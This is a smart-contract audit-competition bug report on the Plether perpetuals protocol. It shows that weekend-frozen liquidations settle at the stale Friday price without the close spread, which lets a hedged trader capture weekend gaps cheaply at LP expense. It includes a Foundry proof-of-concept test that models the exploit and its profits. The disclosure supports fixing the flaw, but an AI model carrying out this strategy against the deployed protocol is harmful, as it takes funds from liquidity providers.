# \#98347 [SC-Medium] Frozen-window liquidation settles at the stale Friday mark with no spread, so a hedged trader can drop the losing leg of a weekend position at Friday's price and keep the winner for the gap

**Submitted on Nov 7th 2026 at 06:19:42 UTC by @Tekmer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98347
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro
The oracle is frozen from Friday 17:00 to Sunday 17:00 New York, and the FAD window keeps the liquidation threshold at 300 bps for the
whole weekend. In the frozen window, liquidation settles at the cached Friday mark with a deterministic 2.5 bps adverse shift and no
frozen-close spread; the 50 bps spread is applied only to voluntary closes. `addMargin` stays open while frozen, and liquidation is
permissionless (the account may even liquidate itself).

A trader holds a LONG and a SHORT of equal size in two accounts over the weekend, with each leg's margin tuned so that weekend carry
takes it across the 3% threshold only late on Sunday (about 35 minutes before the reopen). Before that, on weekend news, the trader adds
margin to the leg expected to win, so no keeper can liquidate it, and lets the other leg be liquidated at the unchanged Friday mark for
about 7.5 bps (10 bps charge, half returned as the keeper bounty if the trader liquidates himself, plus the 2.5 bps shift). On Monday the
winner closes at the gapped live price. The attacker's downside on a wrong call is symmetric, but the option costs 7.5 bps instead of
the 50 bps the protocol charges for the documented voluntary route, so gaps between about 0.2% and 0.7% become profitable that the
spread was designed to make unprofitable.

## Vulnerability Details
1. **Weekend regime.** `MarketCalendarLib.marketStatus` freezes the oracle from the Friday close to the Sunday reopen and keeps the FAD
   window active (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/MarketCalendarLib.sol#L38-L48).
   In the FAD window the planner uses `fadMarginBps` (300) instead of `maintMarginBps` (10) as the liquidation threshold
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1450).
2. **Frozen liquidation price = Friday mark + 2.5 bps, no spread.** `_frozenBasket` replays the cached Engine mark with confidence
   `price * basketMaxConfidenceRatioBps / 10_000`
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L729-L745),
   shifted by `adverseConfidenceMultiplierBps` = 2,500 (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L943-L963):
   10 bps x 25% = 2.5 bps. The frozen-close spread replaces the shift only when `request.isClose`
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L937);
   `planLiquidation` assesses no spread and no fresh VPI
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1424-L1473).
3. **Liquidation is permissionless and may be the account itself.** `OrderLiquidationBatchLogic.executeLiquidation` passes `msg.sender`
   as the keeper (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L706-L728);
   the engine only skips the keeper's carry checkpoint when `keeper == account`
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1331-L1336)
   and the clearinghouse credits the bounty to the keeper
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L1264-L1270).
   Self-liquidation is not required: a rival keeper liquidating the losing leg leaves the attacker with the same gain minus the 5 bps bounty (PoC test 3).
4. **The winner can be protected at will.** `CfdEngine.addMargin` has no FAD or frozen gate
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L501-L529),
   so the attacker lifts the chosen leg above 3% and every keeper gets `CfdEngine__PositionIsSolvent` on it.
5. **The crossing time is tunable.** Carry (500 bps) erodes the pledge through the weekend. With pledges of 3.0335% (LONG) and 3.0320%
   (SHORT) on 375k legs, a rival keeper can first liquidate the LONG at Sunday 20:23:37 UTC and the SHORT at 20:24:59 UTC, 35 minutes
   before the 21:00 UTC reopen; both legs are safe at the Friday freeze and at the decision time. About 1 USDG of margin moves the
   crossing by about 1.7 hours on a 375k leg. A naive 3.02% book is liquidatable by anyone from Friday 21:00 and loses 1,811.17 (PoC test 4).

## Impact Details
PoC at release parameters (manifest economics; pool 250k junior + 1M senior; legs 375k each; decision at Sunday 19:23 UTC; the losing
leg liquidated at about 20:24 UTC; winner closed Monday 12:00 UTC):

| test | scenario | attacker net | pool net |
|---|---|---|---|
| 1 | gap down 1%, attacker liquidates the losing leg himself | **+2,930.83** | -3,231.23 |
| 2 | gap up 1%, same | +2,376.90 | -2,828.80 |
| 3 | gap down 1%, a rival keeper liquidates the losing leg | +2,743.38 | -3,231.23 (rival bounty 187.45) |
| 4 | naive 3.02% book, rival liquidates both legs at Friday 21:00 | -1,811.17 | +1,135.82 |
| 5 | wrong direction call, gap up 1% | -4,560.57 | +4,260.17 |
| 6a | gap down 0.5%, liquidation route | **+1,060.66** | -1,361.06 |
| 6b | gap down 0.5%, documented voluntary frozen close (50 bps spread) | -683.50 | +233.10 |
| 6c | gap down 0.3%, liquidation route | **+312.60** | -613.00 |
| 6d | gap down 0.3%, documented voluntary frozen close | -1,431.56 | +981.16 |
| 7 | control: gap down 1%, documented voluntary frozen close | +1,186.68 | -1,637.08 |

What the table shows: the stale-price option exists on the documented route too (test 7), and the protocol prices it with the 50 bps
spread so that it only pays above roughly a 0.7% gap. The liquidation route sells the same option for about 7.5 bps, so gaps of
0.2-0.7%, which a six-pair FX basket shows most weekends, become profitable against LPs (tests 6a-6d), and at 1% the trader keeps 2.5x
what the documented route leaves. Scaling on a 10M-depth pool at the 40%-of-depth skew cap (measured in the weakness pass, both
directions): 1% gap +31.2k / +23.4k; 0.5% +8.6k / +4.2k; 0.3% about +1.0k; break-even about 0.2%.

Risk and feasibility (stated plainly): the direction has to be chosen before the reopen, from weekend news; a wrong call loses
symmetrically (test 5). The attacker needs two accounts, about 3.3% of each leg plus the VPI charge as collateral, margin tuned to a
late-Sunday crossing, and `addMargin` on the winner before the crossing. An owner pause blocks opens only; liquidation and `addMargin`
stay live, so the owner cannot stop it within a weekend. None of this changes the mechanism: the pool sells a stale-price option at
7.5 bps that its own design prices at 50 bps.

Known-issue check: SECURITY.md L1442 ("frozen-market stale-price protection is a fixed notional spread ... for oracle-frozen voluntary
closes only"), L843 ("liquidation pricing and settlement retain adverse-confidence pricing and do not assess the spread"), L845 ("a
deliberate trade-off: preserve close and liquidation liveness") and L1332-1334 describe the rule that liquidations carry no spread.
They do not say, and the design does not contemplate, that a hedged trader can route a voluntary exit through the liquidation path by
choosing his own margin and the crossing time, so that the stale-price protection is bypassed on demand. The listed limitation covers
the price of a forced liquidation of an unhedged account; this report is about the spread being optional for a hedged one. L1383
(frozen LP exits) and L1436 (liquidation computes no fresh VPI) are different roots. No Cecuro, scan or pre-audit finding covers
weekend gaps, stale-mark straddles or self-routed liquidation.

Suggested fix: assess the frozen-close spread (or settle at the first live mark after the reopen) on liquidations executed in the frozen
window; or block `addMargin` while frozen so a hedged book cannot choose which leg survives.

## References
- MarketCalendarLib.sol L38-L48 (weekend freeze and FAD); CfdEnginePlanLib.sol L1450 (FAD threshold), L1424-L1473 (`planLiquidation`)
- PletherOracle.sol L729-L745 (`_frozenBasket`), L943-L963 (adverse shift), L937 (spread only for `isClose`)
- OrderLiquidationBatchLogic.sol L706-L728 (`executeLiquidation`, keeper = `msg.sender`)
- CfdEngine.sol L501-L529 (`addMargin`), L1331-L1336 (keeper == account allowed); MarginClearinghouse.sol L1264-L1270 (bounty to keeper)
- SECURITY.md L843, L845, L1332-L1334, L1442 (the no-spread liquidation rule), addressed above

## Proof of Concept

Foundry test on the repository's `BasePerpTest` at release parameters. Save as `packages/perps/test/poc/WeekendGapStaleLiquidation.t.sol`
and run from `packages/perps`:

```bash
FOUNDRY_TEST=test/poc forge test --offline --skip script --match-path 'test/poc/WeekendGapStaleLiquidation.t.sol' -vv
```

Expected: 10 tests pass (the table in the description: `test_GapDown_LosingLegSelfLiquidatedAtStaleMark`, `test_GapUp_...`,
`test_GapDown_RivalKeeperLiquidatesLosingLeg`, `test_NaiveBook_RivalLiquidatesBothLegsAtFreeze`, `test_WrongDirectionCall`,
`test_Band_HalfPercent_LiquidationRoute` / `_DocumentedRoute`, `test_Band_ThreeTenths_LiquidationRoute` / `_DocumentedRoute`,
`test_Control_DocumentedRouteOnePercent`). Each test logs the attacker's and the pool's net change in USDG.

<details><summary>WeekendGapStaleLiquidation.t.sol</summary>

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Weekend gap capture through frozen-window liquidation at the stale Friday mark.
//
// A trader holds a LONG and a SHORT of equal size in two accounts over the weekend. Each leg's margin is tuned so that,
// through weekend carry alone, neither leg becomes liquidatable before Sunday about 20:25 UTC (the FX market reopens at
// 21:00 UTC). Before that time the trader forms a view of the Sunday open, adds margin to the leg expected to win, and
// lets the losing leg be liquidated after it crosses the 3% FAD threshold. Frozen-window liquidation uses the cached
// Friday mark with a 2.5 bps adverse shift and no frozen-close spread. The winning leg closes on Monday at the gapped
// live price. The net gain is paid by the LP pool.
//
// Release parameters (arbitrum-sepolia v2.0.0 manifest). Pool: 250k junior + 1M senior. Legs: 375k each.
// Every caller in the attack path is an unprivileged account. vm.snapshotState / vm.revertToState are used only to
// probe, without side effects, whether a third-party keeper could liquidate a leg at a given second.
//
// Run from packages/perps:
//   FOUNDRY_TEST=test/poc forge test --offline --skip script --match-path 'test/poc/WeekendGapStaleLiquidation.t.sol' -vv

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console2} from "forge-std/console2.sol";

contract WeekendGapStaleLiquidationTest is BasePerpTest {

    address internal juniorLp = address(0x1A11);
    address internal seniorLp = address(0xA11CE);
    address internal longLeg = address(0xA7A1);
    address internal shortLeg = address(0xA7A2);
    address internal keeper = address(0x4EE9);
    address internal rivalKeeper = address(0xBEEF);

    uint256 internal constant JUNIOR_ASSETS = 250_000e6;
    uint256 internal constant SENIOR_ASSETS = 1_000_000e6;
    uint256 internal constant LEG_COLLATERAL = 50_000e6;

    // 2024-03-15 is after the 2024-03-10 US DST start: the 17:00 New York FX boundary is 21:00 UTC.
    uint256 internal constant FRIDAY_OPEN_TIME = 1_710_504_000; // Friday 12:00 UTC, live
    uint256 internal constant LAST_LIVE_MARK_TIME = 1_710_532_800; // Friday 20:00 UTC, live
    uint256 internal constant FREEZE_START = 1_710_536_400; // Friday 21:00 UTC, oracle frozen
    uint256 internal constant SUNDAY_REOPEN = 1_710_709_200; // Sunday 21:00 UTC, oracle live again
    uint256 internal constant MONDAY_TIME = 1_710_763_200; // Monday 12:00 UTC, live

    uint256 internal constant FRIDAY_PRICE = 1e8;
    uint256 internal constant LOTS = 3_750;
    uint256 internal constant SIZE = LOTS * CfdTypes.SIZE_QUANTUM;
    uint256 internal constant NOTIONAL = LOTS * FRIDAY_PRICE; // 375,000 USDG per leg

    // Opening margins: pledge 3.02% of notional, plus (LONG, opened first) VPI charge + 4 bps fee, plus the 10 bps
    // liquidation reserve. These are the inputs to commitOrder; the installed pledge is read back from the engine.
    uint256 internal constant PLEDGE_TARGET = NOTIONAL * 302 / 10_000;
    uint256 internal constant VPI_CHARGE = 562_500_000;
    uint256 internal constant OPEN_FEE = NOTIONAL * 4 / 10_000;
    uint256 internal constant LIQUIDATION_RESERVE = NOTIONAL * 10 / 10_000;
    uint256 internal constant LONG_MARGIN = PLEDGE_TARGET + VPI_CHARGE + OPEN_FEE + LIQUIDATION_RESERVE;
    uint256 internal constant SHORT_MARGIN = PLEDGE_TARGET + LIQUIDATION_RESERVE;

    // Friday 20:00 UTC top-ups that move each leg's liquidation crossing (through carry) to Sunday about 20:25 UTC.
    uint256 internal constant LONG_TOP_UP = 55_600_000; // 55.60 USDG
    uint256 internal constant SHORT_TOP_UP = 50_000_000; // 50.00 USDG
    uint256 internal constant WINNER_PROTECTION = 1_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.minOpenNotionalAssets = 1000e6;
        routerConfig.adverseConfidenceMultiplierBps = 2500;
        routerConfig.basketMaxConfidenceRatioBps = 10;
        routerAdmin.proposeRouterConfig(routerConfig);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        routerAdmin.finalizeRouterConfig();

        _fundJunior(juniorLp, JUNIOR_ASSETS);
        _fundSenior(seniorLp, SENIOR_ASSETS);
        _fundTrader(longLeg, LEG_COLLATERAL);
        _fundTrader(shortLeg, LEG_COLLATERAL);
    }

    // ---------------------------------------------------------------- helpers

    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    function _pythData(
        uint256 price
    ) internal returns (bytes[] memory data) {
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllPrices(_basePythFeedIds(), SafeCast.toInt64(SafeCast.toInt256(price)), 0, int32(-8), _now());
        data = new bytes[](1);
        data[0] = abi.encode(price);
    }

    function _keeperRefreshMark(
        uint256 price
    ) internal {
        bytes[] memory data = _pythData(price);
        vm.prank(keeper);
        router.updateMarkPrice(data);
    }

    function _execute(
        uint64 orderId,
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(keeper);
        router.executeOrder(orderId, data);
    }

    function _frozenData() internal pure returns (bytes[] memory d) {
        d = new bytes[](1);
        d[0] = abi.encode(FRIDAY_PRICE);
    }

    function _attackerValue() internal view returns (uint256) {
        return clearinghouse.balanceAssets(longLeg) + engine.traderClaimBalanceAssets(longLeg)
            + clearinghouse.balanceAssets(shortLeg) + engine.traderClaimBalanceAssets(shortLeg);
    }

    function _usdg(
        int256 v
    ) internal pure returns (string memory) {
        bool neg = v < 0;
        uint256 a = uint256(neg ? -v : v);
        string memory frac = vm.toString(a % 1e6);
        while (bytes(frac).length < 6) {
            frac = string.concat("0", frac);
        }
        return string.concat(neg ? "-" : "+", vm.toString(a / 1e6), ".", frac, " USDG");
    }

    function _logUsdg(
        string memory label,
        int256 v
    ) internal pure {
        console2.log(string.concat(label, ": ", _usdg(v)));
    }

    function _hhmm(
        uint256 t
    ) internal pure returns (string memory) {
        uint256 s = t % 86_400;
        string[7] memory days_ = ["Thu", "Fri", "Sat", "Sun", "Mon", "Tue", "Wed"];
        string memory mm = vm.toString((s % 3600) / 60);
        if (bytes(mm).length < 2) mm = string.concat("0", mm);
        string memory ss = vm.toString(s % 60);
        if (bytes(ss).length < 2) ss = string.concat("0", ss);
        return string.concat(days_[(t / 86_400) % 7], " ", vm.toString(s / 3600), ":", mm, ":", ss, " UTC");
    }

    /// @dev Whether a third-party keeper could liquidate `acct` at time `t` (state is restored afterwards).
    function _liqAt(
        address acct,
        uint256 t
    ) internal returns (bool ok) {
        uint256 snap = vm.snapshotState();
        vm.warp(t);
        bytes[] memory d = _frozenData();
        vm.prank(rivalKeeper);
        try router.executeLiquidation(acct, d) {
            ok = true;
        } catch {
            ok = false;
        }
        vm.revertToState(snap);
    }

    /// @dev First frozen second at which `acct` is liquidatable; type(uint256).max if none before the reopen.
    function _crossing(
        address acct
    ) internal returns (uint256) {
        uint256 lo = FREEZE_START;
        uint256 hi = SUNDAY_REOPEN - 1;
        if (_liqAt(acct, lo)) return lo;
        if (!_liqAt(acct, hi)) return type(uint256).max;
        while (hi - lo > 1) {
            uint256 mid = (lo + hi) / 2;
            if (_liqAt(acct, mid)) hi = mid;
            else lo = mid;
        }
        return hi;
    }

    function _openHedgedBook() internal {
        vm.warp(FRIDAY_OPEN_TIME);
        _keeperRefreshMark(FRIDAY_PRICE);
        vm.prank(longLeg);
        uint64 longId = router.commitOrder(CfdTypes.Side.LONG, SIZE, LONG_MARGIN, 0, false);
        _execute(longId, FRIDAY_PRICE);
        vm.prank(shortLeg);
        uint64 shortId = router.commitOrder(CfdTypes.Side.SHORT, SIZE, SHORT_MARGIN, 0, false);
        _execute(shortId, FRIDAY_PRICE);
        (uint256 longSize,,,,,,) = engine.positions(longLeg);
        (uint256 shortSize,,,,,,) = engine.positions(shortLeg);
        assertEq(longSize, SIZE);
        assertEq(shortSize, SIZE);
        vm.warp(LAST_LIVE_MARK_TIME);
        _keeperRefreshMark(FRIDAY_PRICE);
    }

    /// @dev Opens the book and applies the per-leg top-ups. Returns both crossing times and the decision time
    ///      (one hour before the earlier crossing), after checking that no keeper can liquidate either leg earlier.
    function _openLateCrossingBook() internal returns (uint256 longCross, uint256 shortCross, uint256 decision) {
        _openHedgedBook();
        vm.prank(longLeg);
        engine.addMargin(longLeg, LONG_TOP_UP);
        vm.prank(shortLeg);
        engine.addMargin(shortLeg, SHORT_TOP_UP);
        (, uint256 longPledge,,,,,) = engine.positions(longLeg);
        (, uint256 shortPledge,,,,,) = engine.positions(shortLeg);
        longCross = _crossing(longLeg);
        shortCross = _crossing(shortLeg);
        assertLt(longCross, SUNDAY_REOPEN, "LONG must become liquidatable before the reopen");
        assertLt(shortCross, SUNDAY_REOPEN, "SHORT must become liquidatable before the reopen");
        decision = (longCross < shortCross ? longCross : shortCross) - 1 hours;
        assertFalse(_liqAt(longLeg, FREEZE_START), "LONG safe at the freeze");
        assertFalse(_liqAt(shortLeg, FREEZE_START), "SHORT safe at the freeze");
        assertFalse(_liqAt(longLeg, decision), "LONG safe at the decision time");
        assertFalse(_liqAt(shortLeg, decision), "SHORT safe at the decision time");
        _logUsdg("LONG pledge after top-up", int256(longPledge));
        _logUsdg("SHORT pledge after top-up", int256(shortPledge));
        console2.log("LONG pledge, bps of notional x100", longPledge * 1_000_000 / NOTIONAL);
        console2.log("SHORT pledge, bps of notional x100", shortPledge * 1_000_000 / NOTIONAL);
        console2.log(string.concat("LONG first liquidatable at ", _hhmm(longCross)));
        console2.log(string.concat("SHORT first liquidatable at ", _hhmm(shortCross)));
        console2.log(string.concat("decision time ", _hhmm(decision)));
    }

    /// @dev Late-crossing play. `longWins` selects which leg is protected; `liquidator` liquidates the other leg at its
    ///      crossing (the loser itself, or a rival keeper). Returns attacker net and pool net.
    function _latePlay(
        bool longWins,
        uint256 mondayPrice,
        bool selfLiquidate
    ) internal returns (int256 attackerNet, int256 poolNet) {
        uint256 v0 = _attackerValue();
        uint256 p0 = pool.totalAssets();
        (uint256 longCross, uint256 shortCross, uint256 decision) = _openLateCrossingBook();
        address winner = longWins ? longLeg : shortLeg;
        address loser = longWins ? shortLeg : longLeg;
        uint256 loserCross = longWins ? shortCross : longCross;

        vm.warp(decision);
        vm.prank(winner);
        engine.addMargin(winner, WINNER_PROTECTION);

        uint256 crossNow = _crossing(loser);
        assertLe(crossNow, loserCross + 1, "winner top-up does not delay the loser");
        vm.warp(crossNow);
        address liquidator = selfLiquidate ? loser : rivalKeeper;
        vm.prank(liquidator);
        router.executeLiquidation(loser, _frozenData());
        (uint256 loserSize,,,,,,) = engine.positions(loser);
        assertEq(loserSize, 0, "losing leg liquidated at the stale Friday mark");
        assertFalse(_liqAt(winner, SUNDAY_REOPEN - 1), "winner cannot be liquidated before the reopen");
        console2.log(string.concat("losing leg liquidated at ", _hhmm(crossNow)));
        if (!selfLiquidate) {
            _logUsdg("rival keeper bounty", int256(clearinghouse.balanceAssets(rivalKeeper)));
        }

        vm.warp(MONDAY_TIME);
        _keeperRefreshMark(mondayPrice);
        vm.prank(winner);
        uint64 closeId =
            router.commitOrder(longWins ? CfdTypes.Side.LONG : CfdTypes.Side.SHORT, SIZE, 0, 0, true);
        _execute(closeId, mondayPrice);
        (uint256 winnerSize,,,,,,) = engine.positions(winner);
        assertEq(winnerSize, 0, "winning leg closed");

        attackerNet = int256(_attackerValue()) - int256(v0);
        poolNet = int256(pool.totalAssets()) - int256(p0);
    }

    /// @dev Documented route on the same book: voluntary frozen close of the losing SHORT (50 bps spread) at the
    ///      decision time, LONG closed Monday.
    function _documentedRoute(
        uint256 mondayPrice
    ) internal returns (int256 attackerNet, int256 poolNet) {
        uint256 v0 = _attackerValue();
        uint256 p0 = pool.totalAssets();
        (,, uint256 decision) = _openLateCrossingBook();
        vm.warp(decision);
        vm.prank(shortLeg);
        uint64 shortCloseId = router.commitOrder(CfdTypes.Side.SHORT, SIZE, 0, 0, true);
        vm.prank(keeper);
        router.executeOrder(shortCloseId, _frozenData());
        (uint256 shortSize,,,,,,) = engine.positions(shortLeg);
        assertEq(shortSize, 0, "SHORT closed voluntarily in the frozen window");
        vm.warp(MONDAY_TIME);
        _keeperRefreshMark(mondayPrice);
        vm.prank(longLeg);
        uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true);
        _execute(closeId, mondayPrice);
        attackerNet = int256(_attackerValue()) - int256(v0);
        poolNet = int256(pool.totalAssets()) - int256(p0);
    }

    // ---------------------------------------------------------------- tests

    /// (1) Headline: gap down 1%. LONG protected, SHORT self-liquidated at the stale mark after its crossing.
    function test_GapDown_LosingLegSelfLiquidatedAtStaleMark() public {
        (int256 a, int256 p) = _latePlay(true, 0.99e8, true);
        _logUsdg("gap down 1%, self-liquidation: attacker net", a);
        _logUsdg("gap down 1%, self-liquidation: pool net", p);
        assertGt(a, 0);
    }

    /// (2) Gap up 1%. SHORT protected, LONG self-liquidated.
    function test_GapUp_LosingLegSelfLiquidatedAtStaleMark() public {
        (int256 a, int256 p) = _latePlay(false, 1.01e8, true);
        _logUsdg("gap up 1%, self-liquidation: attacker net", a);
        _logUsdg("gap up 1%, self-liquidation: pool net", p);
        assertGt(a, 0);
    }

    /// (3) A rival keeper liquidates the losing leg instead of the attacker. Self-liquidation is not required.
    function test_GapDown_RivalKeeperLiquidatesLosingLeg() public {
        (int256 a, int256 p) = _latePlay(true, 0.99e8, false);
        _logUsdg("gap down 1%, rival liquidates loser: attacker net", a);
        _logUsdg("gap down 1%, rival liquidates loser: pool net", p);
        assertGt(a, 0);
    }

    /// (4) Naive book (3.02% pledge, no top-ups): a rival keeper liquidates both legs at the Friday 21:00 UTC freeze.
    function test_NaiveBook_RivalLiquidatesBothLegsAtFreeze() public {
        uint256 v0 = _attackerValue();
        uint256 p0 = pool.totalAssets();
        _openHedgedBook();
        (, uint256 longPledge,,,,,) = engine.positions(longLeg);
        (, uint256 shortPledge,,,,,) = engine.positions(shortLeg);
        _logUsdg("naive LONG pledge", int256(longPledge));
        _logUsdg("naive SHORT pledge", int256(shortPledge));
        vm.warp(FREEZE_START);
        assertTrue(engine.isOracleFrozen());
        vm.prank(rivalKeeper);
        router.executeLiquidation(shortLeg, _frozenData());
        vm.prank(rivalKeeper);
        router.executeLiquidation(longLeg, _frozenData());
        (uint256 ls,,,,,,) = engine.positions(longLeg);
        (uint256 ss,,,,,,) = engine.positions(shortLeg);
        assertEq(ls + ss, 0, "both legs liquidated at the freeze");
        int256 a = int256(_attackerValue()) - int256(v0);
        _logUsdg("naive book, both legs liquidated at freeze: attacker net", a);
        _logUsdg("naive book: rival keeper bounty", int256(clearinghouse.balanceAssets(rivalKeeper)));
        _logUsdg("naive book: pool net", int256(pool.totalAssets()) - int256(p0));
        assertLt(a, 0);
    }

    /// (5) Wrong direction call: LONG protected and SHORT self-liquidated, but the basket gaps up 1%.
    function test_WrongDirectionCall() public {
        (int256 a, int256 p) = _latePlay(true, 1.01e8, true);
        _logUsdg("wrong call (kept LONG, gap up 1%): attacker net", a);
        _logUsdg("wrong call: pool net", p);
        assertLt(a, 0);
    }

    /// (6) Liquidation route vs documented voluntary-frozen-close route at 0.5% and 0.3% gaps down.
    function test_Band_HalfPercent_LiquidationRoute() public {
        (int256 a, int256 p) = _latePlay(true, 0.995e8, true);
        _logUsdg("gap down 0.5%, liquidation route: attacker net", a);
        _logUsdg("gap down 0.5%, liquidation route: pool net", p);
    }

    function test_Band_HalfPercent_DocumentedRoute() public {
        (int256 a, int256 p) = _documentedRoute(0.995e8);
        _logUsdg("gap down 0.5%, documented route: attacker net", a);
        _logUsdg("gap down 0.5%, documented route: pool net", p);
    }

    function test_Band_ThreeTenths_LiquidationRoute() public {
        (int256 a, int256 p) = _latePlay(true, 0.997e8, true);
        _logUsdg("gap down 0.3%, liquidation route: attacker net", a);
        _logUsdg("gap down 0.3%, liquidation route: pool net", p);
    }

    function test_Band_ThreeTenths_DocumentedRoute() public {
        (int256 a, int256 p) = _documentedRoute(0.997e8);
        _logUsdg("gap down 0.3%, documented route: attacker net", a);
        _logUsdg("gap down 0.3%, documented route: pool net", p);
    }

    /// (7) Control: documented route at a 1% gap down.
    function test_Control_DocumentedRouteOnePercent() public {
        (int256 a, int256 p) = _documentedRoute(0.99e8);
        _logUsdg("gap down 1%, documented route: attacker net", a);
        _logUsdg("gap down 1%, documented route: pool net", p);
    }

}
```

</details>
